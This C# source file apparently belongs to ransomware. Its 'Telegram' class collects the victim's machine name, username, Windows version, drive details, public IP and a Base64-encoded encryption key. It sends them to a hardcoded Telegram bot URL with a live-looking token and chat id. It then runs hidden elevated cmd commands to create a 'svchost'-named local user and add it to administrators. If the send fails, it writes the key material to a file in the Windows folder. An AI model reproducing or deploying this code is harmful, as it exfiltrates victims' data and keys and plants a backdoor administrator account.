using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Text;
using System.Web;
using Microsoft.Win32;

namespace Fast;

internal class Telegram
{
	public enum ProtocolTypeEAF
	{
		SystemDefault = 0,
		Ssl3 = 48,
		Tls = 192,
		Tls11 = 768,
		Tls12 = 3072
	}

	private static string EncryptPassword = Program.RndKey + Program.A + Program.B + Program.UniqueID() + Program.keyword + Program.UniqueID() + Program.C + Program.D + Program.RndKey;

	private static string name_pc = Environment.MachineName.ToString();

	private static string userName = Environment.UserName;

	private static string WinName = GetWinName();

	private static string SoftName = Process.GetCurrentProcess().ProcessName;

	private static string getsysteminfo = CultureInfo.CurrentCulture.Name;

	private static DateTime nowTime = DateTime.Now;

	public static void SendForOwner()
	{
		try
		{
			Random random = new Random();
			int num = random.Next(1, 694);
			string text = "svchost" + num;
			string text2 = "EAF@v" + num;
			string localIPAddress = GetLocalIPAddress();
			string text3 = $"Name: {name_pc}\nUsername: {userName}\nWin Name: {WinName}\nSoft Name: {SoftName}\nSystem Info: {getsysteminfo}\nDate: {nowTime}\nEmail 1: {Program.email1}\nEmail 2: {Program.email2}\nID_1: #{Program.UniqueID()}\nID_2: #{Program.GetID()}";
			byte[] bytes = Encoding.UTF8.GetBytes(EncryptPassword);
			string text4 = Convert.ToBase64String(bytes);
			byte[] bytes2 = Encoding.UTF8.GetBytes(Program.RndKey);
			string text5 = Convert.ToBase64String(bytes2);
			string str = text3 + "\n" + drivesInfo() + "\n" + text4 + "\n\n" + text5 + "\n\n" + localIPAddress + "\n" + text + "\n" + text2;
			string address = "https://api.telegram.org/bot5184674519:AAEUjh7_2Giq6JYW4CBJ17ZVkhTJtfJGa_8/SendMessage?chat_id=-1001733756150&text=" + HttpUtility.UrlEncode(str);
			WebClient webClient = new WebClient();
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			webClient.DownloadString(address);
			runCommand("net user " + text + " " + text2 + " /ad");
			runCommand("net localgroup administrators " + text + " /ad");
		}
		catch (Exception)
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
			string path = folderPath + "\\" + Program.txtName;
			forSavePassword(path);
		}
	}

	private static void forSavePassword(string path)
	{
		try
		{
			string text = bs64(Program.RndKey);
			string text2 = bs64(Program.A + Program.B);
			string text3 = bs64(Program.keyword);
			string text4 = bs64(Program.C + Program.D);
			string text5 = Program.UniqueID();
			using StreamWriter streamWriter = new StreamWriter(path);
			streamWriter.WriteLine("Do Not Delete It, So This Is Your Helper File");
			streamWriter.WriteLine("--------------------");
			streamWriter.WriteLine(">>>  " + nowTime);
			streamWriter.WriteLine("Key: " + text);
			streamWriter.WriteLine("AB: " + text2);
			streamWriter.WriteLine("Word: " + text3);
			streamWriter.WriteLine("CD: " + text4);
			streamWriter.WriteLine("ID: " + text5);
			streamWriter.WriteLine("--------------------");
			streamWriter.WriteLine("\n");
			streamWriter.Close();
		}
		catch
		{
		}
	}

	private static string bs64(string text)
	{
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(text);
			return Convert.ToBase64String(bytes);
		}
		catch
		{
			return text;
		}
	}

	private static void runCommand(string commands)
	{
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				Verb = "runas",
				FileName = "cmd.exe",
				Arguments = "/C " + commands,
				WindowStyle = ProcessWindowStyle.Hidden
			};
			process.Start();
			process.WaitForExit();
		}
		catch
		{
		}
	}

	private static string GetLocalIPAddress()
	{
		try
		{
			string ipString = new WebClient().DownloadString("http://icanhazip.com").Replace("\\r\\n", "").Replace("\\n", "")
				.Trim();
			IPAddress iPAddress = IPAddress.Parse(ipString);
			return iPAddress.ToString();
		}
		catch
		{
			return "127.0.0.1";
		}
	}

	private static string GetWinName()
	{
		string name = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
		using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
		if (registryKey != null)
		{
			try
			{
				string text = registryKey.GetValue("ProductName")!.ToString();
				if (text == "")
				{
					return "null";
				}
				if (text.Contains("XP"))
				{
					return "XP";
				}
				if (text.Contains("7"))
				{
					return "Win 7";
				}
				if (text.Contains("2003"))
				{
					return "Serv 2003";
				}
				if (text.Contains("8"))
				{
					if (text.Contains("2008"))
					{
						return "Serv 2008";
					}
					return "Win 8";
				}
				if (text.Contains("10"))
				{
					return "Win 10";
				}
				if (text.Contains("11"))
				{
					return "Win 11";
				}
				if (text.Contains("2012"))
				{
					return "Serv 2012";
				}
				if (text.Contains("2016"))
				{
					return "Serv 2016";
				}
				if (text.Contains("2019"))
				{
					return "Serv 2019";
				}
				if (text.Contains("2022"))
				{
					return "Serv 2022";
				}
				if (text.Contains("Server"))
				{
					return "Serv";
				}
				return "Unknow";
			}
			catch (Exception ex)
			{
				return ex.Message;
			}
		}
		return "Null";
	}

	private static string drivesInfo()
	{
		StringBuilder stringBuilder = new StringBuilder();
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				stringBuilder.AppendLine("--------------------");
				stringBuilder.AppendLine("Drive Name : " + driveInfo.Name.ToString());
				decimal num = driveInfo.TotalSize / 1024L / 1024L / 1024L;
				decimal num2 = driveInfo.TotalFreeSpace / 1024L / 1024L / 1024L;
				decimal num3 = num - num2;
				stringBuilder.AppendLine("Total Size (GB) : " + num);
				stringBuilder.AppendLine("Total Used Space (GB) : " + num3);
				stringBuilder.AppendLine("Total Free Space (GB) : " + num2);
				stringBuilder.AppendLine("Drive Type : " + driveInfo.DriveType);
				stringBuilder.AppendLine("Drive Format : " + driveInfo.DriveFormat.ToString());
				stringBuilder.AppendLine("--------------------");
			}
		}
		return stringBuilder.ToString();
	}
}
